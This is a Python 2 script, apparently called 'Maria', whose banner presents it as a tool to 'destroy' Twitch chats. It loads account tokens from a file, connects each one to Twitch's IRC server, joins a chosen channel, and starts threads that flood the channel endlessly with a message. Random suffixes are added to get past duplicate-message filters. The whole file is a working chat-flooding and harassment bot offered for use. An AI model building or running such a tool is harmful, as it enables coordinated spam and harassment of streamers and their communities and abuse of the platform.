import socket
import sys
import threading
import random
import time
import string
import os
import textwrap

readbuffer = ""
MODT = False

os.system("clear")
print textwrap.dedent("""
..........:?77=~::::::::=+7I~,..........
.......,?7=,,:~~~~~~~~~~=~~::+7?,.......
....,:I?,::::~:::::~:~~~=~~=~=:~I?,.....
....?I:::~::::::::::::~~:~~=====~~I+....
..:7~,:::~=,+I,:::::::::::$+~+====:+7,..
.~7,~~:O+,$$+ZO7=,,::::+$O$?OI:7$=+~~7:.
~7:~~~:~$ZI7$:,.=O=,,+O=~~=Z77Z7=+=+=~$,
7::~:~~::,,,,,,,,,,,,:~:~~~~=~====++?=~7
+:~~~:::::,,,,,,,,,,:::::~~~~=====+=++~?
:~~~~::::::,,,,,,::::::::~~~~=====++++=~
:=~~~~:~::::,:,:~:,::::~=~~~======+++++~
~=~~~~~~~:::::OO$Z88O88Z$8I~~====++?++?~
~==~=~~~~~::=8OZZZZ$$$ZZ$O8I====+++?++?~
~+==~~~~~~:I8OOOOOOOOOOOOOO8?==++++++?+:
~=+===~=~?O888OOZ$$Z8O$$OOOO8O+++++++?+:
:=+=====~=~+88OZ$7I?I+II$$ZO7++++++++?=~
+~+=+=======$OOOZZZ$$$$$ZZO8++??++++++~?
$~=+++===+==+8OOOOOOOOOOOO8Z+++++++?+~=7
:$:=?++++++++78OOOOZOOOOO8O?++?+?+??=:7:
.=7:=?+?+++++??Z88888888O7+++++++??~=Z:.
..,7=~+?++++++?I?IIIIIIII??+?+++++:?I...
...,?I:=++??++++++++++++?+++++++~~7+....
.,,,,:I?~~++++++++++?++++++++=~~7?:,,.,:
..,:,,,:?7+:~=++++++++++++=~~?7+::,.:I7I
...,,,,,,,=?7I~::::~~:::~+I7?=:,,,.:IIII
""")
print "[----] Maria (is talk and destroy twitch) By Zen and Neon [----]"

def randomString():
	return ''.join([random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(0, 8)])

def floodThread(socket, user, text, delay):
	while True:
		socket.send('PRIVMSG ' + user + ' :' + text + '\r\n')
		time.sleep(delay)
		socket.send('PRIVMSG ' + user + ' :' + text + '_' + randomString() + '\r\n')
		time.sleep(delay)
try:
    user = "#" + sys.argv[1]
    delay = int(sys.argv[2])
    message = ' '.join(sys.argv[3:])
    print "[-] '" + message + "' to twitch.tv/" + sys.argv[1]
    tokens = open('tokens.txt').read().split('\n')
    for x in tokens:
        s = socket.socket()
        s.connect(('irc.twitch.tv', 6667))
        s.send('PASS ' + x + '\r\n')
        s.send('NICK ' + randomString() + '\r\n')
        s.send('JOIN ' + user + '\r\n')
        t = threading.Thread(target=floodThread, args=(s, user, message, delay,),)
        t.start()
except Exception as e:
	print "[#] Maria-error: " + str(e)
	
while True:
    readbuffer = readbuffer + s.recv(1024)
    temp = string.split(readbuffer, "\n")
    readbuffer = temp.pop()
 
    for line in temp:
        # Checks whether the message is PING because its a method of Twitch to check if you're afk
        if (line[0] == "PING"):
            s.send("PONG :tmi.twitch.tv\r\n")
        else:
            # Splits the given string so we can work with it better
            parts = string.split(line, ":")
 
            if "QUIT" not in parts[1] and "JOIN" not in parts[1] and "PART" not in parts[1]:
                try:
                    # Sets the message variable to the actual message sent
                    message = parts[2][:len(parts[2]) - 1]
                except:
                    message = ""
                # Sets the username variable to the actual username
                usernamesplit = string.split(parts[1], "!")
                username = usernamesplit[0]
              
					
					
 
        for l in parts:
            if "End of /NAMES list" in l:
                MODT = True
